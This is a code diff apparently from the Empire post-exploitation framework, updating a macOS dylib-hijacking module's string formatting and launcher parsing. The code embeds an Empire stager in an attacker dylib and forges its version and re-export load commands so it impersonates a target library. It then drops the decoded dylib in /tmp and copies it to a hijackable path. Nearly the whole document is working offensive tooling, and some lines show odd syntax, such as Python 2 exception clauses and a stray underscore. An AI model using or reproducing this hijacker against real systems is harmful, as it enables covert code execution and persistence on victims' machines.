@@ -1,11 +1,11 @@
 import base64
-from builtins import object
 from typing import Dict, Optional, Tuple
 
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils.string_util import removeprefix, removesuffix
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -30,7 +30,10 @@ class Module(object):
             userAgent=user_agent,
             safeChecks=safe_checks,
         )
-        launcher = launcher.strip("echo").strip(" | python3 &").strip('"')
+        launcher = removeprefix(launcher, "echo ")
+        launcher = removesuffix(launcher, " | python3 &")
+        launcher = launcher.strip('"')
+
         dylib_bytes = main_menu.stagers.generate_dylib(
             launcherCode=launcher, arch=arch, hijacker="true"
         )
@@ -72,7 +75,7 @@ def run(attackerDYLIB):
 
     _CPU_ARCH_ABI64  = 0x01000000
 
-    CPU_TYPE_NAMES = {
+    CPU_TYPE_NAMES = {{
         -1:     'ANY',
         1:      'VAX',
         6:      'MC680x0',
@@ -88,7 +91,7 @@ def run(attackerDYLIB):
         16:     'Alpha',
         18:     'PowerPC',
         _CPU_ARCH_ABI64  | 18:    'PowerPC64',
-    }
+    }}
 
 
 
@@ -127,14 +130,14 @@ def run(attackerDYLIB):
         if not os.path.exists(attackerDYLIB):
 
 
-            print('ERROR: dylib \\'%%s\\' not found' %% (attackerDYLIB))
+            print('ERROR: dylib \\'%s\\' not found' % (attackerDYLIB))
             return False
 
 
         if not os.path.exists(targetDYLIB):
 
 
-            print('ERROR: dylib \\'%%s\\' not found' %% (targetDYLIB))
+            print('ERROR: dylib \\'%s\\' not found' % (targetDYLIB))
             return False
 
         attacker = open(attackerDYLIB)
@@ -185,7 +188,7 @@ def run(attackerDYLIB):
         except Exception, e:
 
             #err msg
-            print('EXCEPTION (finding load commands): %%s' %% e)
+            print('EXCEPTION (finding load commands): %s' % e)
 
             #reset
             matchedOffsets = None
@@ -201,7 +204,7 @@ def run(attackerDYLIB):
         try:
 
             #dbg msg
-            print(' [+] parsing \\'%%s\\' to extract version info' %% (os.path.split(targetDYLIB)[1])_
+            print(' [+] parsing \\'%s\\' to extract version info' % (os.path.split(targetDYLIB)[1])_
 
             #open target .dylib
             fileHandle = open(targetDYLIB, 'rb')
@@ -212,13 +215,13 @@ def run(attackerDYLIB):
             if not versionOffsets or not len(versionOffsets):
 
                 #err msg
-                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(targetDYLIB)[1]))
+                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %s' % (os.path.split(targetDYLIB)[1]))
 
                 #bail
                 return False
 
             #dbg msg
-            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets))
+            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %s' % (versionOffsets))
 
             #seek to offset of LC_ID_DYLIB
             fileHandle.seek(versionOffsets[0], io.SEEK_SET)
@@ -227,7 +230,7 @@ def run(attackerDYLIB):
             fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
 
             '''
-            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
+            struct dylib {{ union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; }};
             '''
 
             #extract current version
@@ -237,14 +240,14 @@ def run(attackerDYLIB):
             compatibilityVersion = fileHandle.read(4)
 
             #dbg msg(s)
-            print('     extracted current version: 0x%%x' %% (struct.unpack('<L', currentVersion)[0]))
-            print('     extracted compatibility version: 0x%%x' %% (struct.unpack('<L', compatibilityVersion)[0]))
+            print('     extracted current version: 0x%x' % (struct.unpack('<L', currentVersion)[0]))
+            print('     extracted compatibility version: 0x%x' % (struct.unpack('<L', compatibilityVersion)[0]))
 
             #close
             fileHandle.close()
 
             #dbg msg
-            print(' [+] parsing \\'%%s\\' to find version info' %% (os.path.split(attackerDYLIB)[1]))
+            print(' [+] parsing \\'%s\\' to find version info' % (os.path.split(attackerDYLIB)[1]))
 
             #open target .dylib
             fileHandle = open(attackerDYLIB, 'rb+')
@@ -255,14 +258,14 @@ def run(attackerDYLIB):
             if not versionOffsets or not len(versionOffsets):
 
                 #err msg
-                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1]))
+                print('ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %s' % (os.path.split(attackerDYLIB)[1]))
 
                 #bail
                 return False
 
             #dbg msg(s)
-            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets))
-            print(' [+] updating version info in %%s to match %%s' %% ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1])))
+            print('     found \\'LC_ID_DYLIB\\' load command at offset(s): %s' % (versionOffsets))
+            print(' [+] updating version info in %s to match %s' % ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1])))
 
             #update version info
             for versionOffset in versionOffsets:
@@ -274,7 +277,7 @@ def run(attackerDYLIB):
                 fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
 
                 #dbg msg
-                print('setting version info at offset %%s' %% (versionOffset))
+                print('setting version info at offset %s' % (versionOffset))
 
                 #set current version
                 fileHandle.write(currentVersion)
@@ -288,7 +291,7 @@ def run(attackerDYLIB):
         except Exception, e:
 
             #err msg
-            print('EXCEPTION (configuring version info): %%s' %% e)
+            print('EXCEPTION (configuring version info): %s' % e)
 
 
         return True
@@ -301,7 +304,7 @@ def run(attackerDYLIB):
         try:
 
             #dbg msg
-            print(' [+] parsing \\'%%s\\' to extract faux re-export info' %% (os.path.split(attackerDYLIB)[1]))
+            print(' [+] parsing \\'%s\\' to extract faux re-export info' % (os.path.split(attackerDYLIB)[1]))
 
             #open attacker's .dylib
             fileHandle = open(attackerDYLIB, 'rb+')
@@ -312,16 +315,16 @@ def run(attackerDYLIB):
             if not reExportOffsets or not len(reExportOffsets):
 
                 #err msg
-                print('ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1]))
+                print('ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %s' % (os.path.split(attackerDYLIB)[1]))
 
                 #bail
                 return False
 
             #dbg msg
-            print('     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %%s' %% (reExportOffsets))
+            print('     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %s' % (reExportOffsets))
 
             '''
-            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
+            struct dylib {{ union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; }};
             '''
 
             #update re-export info
@@ -338,13 +341,13 @@ def run(attackerDYLIB):
                 commandSize = struct.unpack('<L', fileHandle.read(4))[0]
 
                 #dbg msg
-                print('     extracted LC command size: 0x%%x' %% (commandSize))
+                print('     extracted LC command size: 0x%x' % (commandSize))
 
                 #read in path offset
                 pathOffset = struct.unpack('<L', fileHandle.read(4))[0]
 
                 #dbg msg
-                print('     extracted path offset: 0x%%x' %% (pathOffset))
+                print('     extracted path offset: 0x%x' % (pathOffset))
 
                 #seek to path offset
                 fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)
@@ -354,7 +357,7 @@ def run(attackerDYLIB):
                 pathSize = commandSize - (fileHandle.tell() - reExportOffset)
 
                 #dbg msg
-                print('     computed path size: 0x%%x' %% (pathSize))
+                print('     computed path size: 0x%x' % (pathSize))
 
                 #read out path
                 data = targetDYLIB + '\\0' * (pathSize - len(targetDYLIB))
@@ -364,7 +367,7 @@ def run(attackerDYLIB):
                 #path = path.rstrip('\0')
 
                 #dbg msg(s)
-                #print '     extracted faux path: %%s' %% (path)
+                #print '     extracted faux path: %s' % (path)
 
                 #close
                 fileHandle.close()
@@ -378,7 +381,7 @@ def run(attackerDYLIB):
         except Exception, e:
 
             #err msg
-            print('EXCEPTION (configuring re-exports): %%s' %% e)
+            print('EXCEPTION (configuring re-exports): %s' % e)
 
             #bail
             return False
@@ -409,11 +412,11 @@ def run(attackerDYLIB):
 
         return True
 
-    
-    #target .dylib
-    targetDYLIB = "%s"
 
-    vrpath = "%s"
+    #target .dylib
+    targetDYLIB = "{}"
+
+    vrpath = "{}"
 
 
     #configured .dylib
@@ -423,7 +426,7 @@ def run(attackerDYLIB):
     configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]
 
     #dbg msg
-    print(' [+] configuring %%s to hijack %%s' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1]))
+    print(' [+] configuring %s to hijack %s' % (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1]))
 
     #check prereqs
     # ->i.e. sanity checks
@@ -439,13 +442,13 @@ def run(attackerDYLIB):
     if not configure(attackerDYLIB, targetDYLIB):
 
         #err msg
-        print('ERROR: failed to configure %%s\\n' %% (os.path.split(targetDYLIB)[1]))
+        print('ERROR: failed to configure %s\\n' % (os.path.split(targetDYLIB)[1]))
 
         #bail
         return ""
 
     #dbg msg
-    print(' [+] copying configured .dylib to %%s' %% (configuredDYLIB))
+    print(' [+] copying configured .dylib to %s' % (configuredDYLIB))
 
     #make a (local) copy w/ name
     shutil.copy2(attackerDYLIB, configuredDYLIB)
@@ -459,12 +462,12 @@ def run(attackerDYLIB):
 
     os.remove(configuredDYLIB)
     #dbg msg
-    
-    print('\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath))
+
+    print('\\nHijacker created, renamed to %s, and copied to %s' % (configuredDYLIB,vrpath))
 
 import base64
 import uuid
-encbytes = "%s"
+encbytes = "{}"
 filename = str(uuid.uuid4())
 path = "/tmp/" + filename + ".dylib"
 decodedDylib = base64.b64decode(encbytes)
@@ -472,7 +475,7 @@ temp = open(path,'wb')
 temp.write(decodedDylib)
 temp.close()
 run(path)
-""" % (
+""".format(
             dylib,
             vrpath,
             encoded_dylib,
